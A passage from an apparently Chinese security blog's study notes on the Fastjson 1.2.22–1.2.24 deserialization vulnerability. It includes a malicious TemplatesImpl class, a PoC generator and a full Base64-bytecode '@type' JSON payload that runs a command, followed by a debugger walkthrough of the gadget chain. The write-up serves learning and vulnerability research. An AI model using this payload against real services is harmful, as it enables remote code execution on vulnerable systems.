<p>攻击截图：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200627122739474.png" alt="image-20200627122739474"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于第一种客户端攻击服务器，其实是客户端自己有payload恶意函数，序列化对象发送给服务器时进行反序列化，造成漏洞触发。</p>
<p>第二种服务器攻击客户端，其实是服务器内部本身就有payload恶意函数，当对象请求调用的时候，服务器将序列化对象返还给客户端，客户端本地进行反序列化，漏洞遭到触发。</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson学习笔记02</title>
    <url>/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>冯唐易老，李广难封。</p>
</blockquote>
<p>前一篇总结了fastjson的基础知识，今天来介绍由它引起的一系列漏洞。</p>
<a id="more"></a>

<h1 id="1-2-22-1-2-24反序列化漏洞"><a href="#1-2-22-1-2-24反序列化漏洞" class="headerlink" title="1.2.22-1.2.24反序列化漏洞"></a>1.2.22-1.2.24反序列化漏洞</h1><p>对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：</p>
<ul>
<li>基于TemplateImpl；</li>
<li>基于JNDI（又分为基于Bean Property类型和Field类型）；</li>
</ul>
<h2 id="需要的jar包"><a href="#需要的jar包" class="headerlink" title="需要的jar包"></a>需要的jar包</h2><p>直接贴出pom.xml文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>maven还是好用鸭，几行搞定</p>
<h2 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h2><p>最早是<a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">廖师傅</a>提出来的。</p>
<h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>需要设置<strong>Feature.SupportNonPublicField</strong>进行反序列化操作才能成功触发利用。</p>
<h4 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h4><p>恶意类Test.java，用于弹计算器，至于为啥需要继承AbstractTranslet类在后面的调试分析中会具体看到：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Test t = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。</p>
<p>PoC.java，Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/TemplateImpl/Test.class"</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object<span class="class">.<span class="keyword">class</span>, <span class="title">config</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行即可弹出计算器：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624213753718.png" alt="image-20200624213753718"></p>
<p>关键看输出的构造的PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA=="</span>],<span class="string">'_name'</span>:<span class="string">'a.b'</span>,<span class="string">'_tfactory'</span>:&#123; &#125;,<span class="string">"_outputProperties"</span>:&#123; &#125;,<span class="string">"_name"</span>:<span class="string">"a"</span>,<span class="string">"_version"</span>:<span class="string">"1.0"</span>,<span class="string">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>PoC中几个重要的Json键的含义：</p>
<ul>
<li><strong>@type</strong>——指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</li>
<li><strong>_bytecodes</strong>——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。</li>
<li><strong>_outputProperties</strong>——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</li>
<li><strong>_tfactory:{}</strong>——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</li>
</ul>
<p>在这个poc中，最核心的部分是<strong>_bytecodes</strong>，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中<strong>_bytecodes</strong>却是私有属性，<strong>_name</strong>也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样<strong>_bytecodes</strong>字段才会被反序列化。</p>
<p><strong>_tfactory</strong>这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置<strong>_tfactory</strong>为<code>{ }</code>,fastjson会调用其无参构造函数得<strong>_tfactory</strong>对象，这样就解决了某些版本中在defineTransletClasses()用到会引用<strong>_tfactory</strong>属性导致异常退出。接下来我们看下TemplatesImpl.java的几个关键函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也就到了最终的执行命令的位置Runtime.getRuntime.exec()</p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>下面我们直接在反序列化的那句代码上打上断点进行调试分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(text1, Object<span class="class">.<span class="keyword">class</span>, <span class="title">config</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215615062.png" alt="image-20200624215615062"></p>
<p>跟进该函数，发现会返回去调用DefaultJSONParser.parse()函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215740473.png" alt="image-20200624215740473"></p>
<p>继续调试，在DefaultJSONParser.parse()里是对JSON内容进行扫描，在switch语句中匹配上了”{“即对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215811151.png" alt="image-20200624215811151"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215903686.png" alt="image-20200624215903686"></p>
<p>在DefaultJSONParser.parseObject()中，通过for语句循环解析JSON数据内容，其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624220141214.png" alt="image-20200624220141214"></p>
<p>往下调试，判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624220701681.png" alt="image-20200624220701681"></p>
<p>跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以”[“开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说<strong>这两个判断条件是后面补丁绕过的漏洞点</strong>，值得注意：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624221008058.png" alt="image-20200624221008058"></p>
<p>往下看，通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624221440346.png" alt="image-20200624221440346"></p>
<p>跟进去，循环扫描解析，解析到key为<code>_bytecodes</code>时，调用parseField()进一步解析：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222148671.png" alt="image-20200624222148671"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222554458.png" alt="image-20200624222554458"></p>
<p>跟进DefaultFieldDeserializer.parseField()函数中，解析出<code>_bytecodes</code>对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222706533.png" alt="image-20200624222706533"></p>
<p>FieldDeserializer.setValue()函数，看到是调用<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的set方法来设置<code>_bytecodes</code>的值：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222755522.png" alt="image-20200624222755522"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624223811017.png" alt="image-20200624223811017"></p>
<p>返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。</p>
<p>经过漫长的跟进之后，当解析到<code>_outputProperties</code>的内容时，看到前面的下划线被去掉了：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624225046512.png" alt="image-20200624225046512"></p>
<p>跟进该方法，发现会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624225226724.png" alt="image-20200624225226724"></p>
<p>从invoke的地方跟进去，看到在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624225351667.png" alt="image-20200624225351667"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624230437144.png" alt="image-20200624230437144"></p>
<p>跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/17.png" alt="img"></p>
<p>继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/18.png" alt="img"></p>
<p>再往下就是新建Test类实例的过程，并调用Test类的构造函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/19.png" alt="img"></p>
<p>再之后就是弹计算器了。</p>
<p><strong>整个调试过程主要的函数调用栈如下：</strong></p>
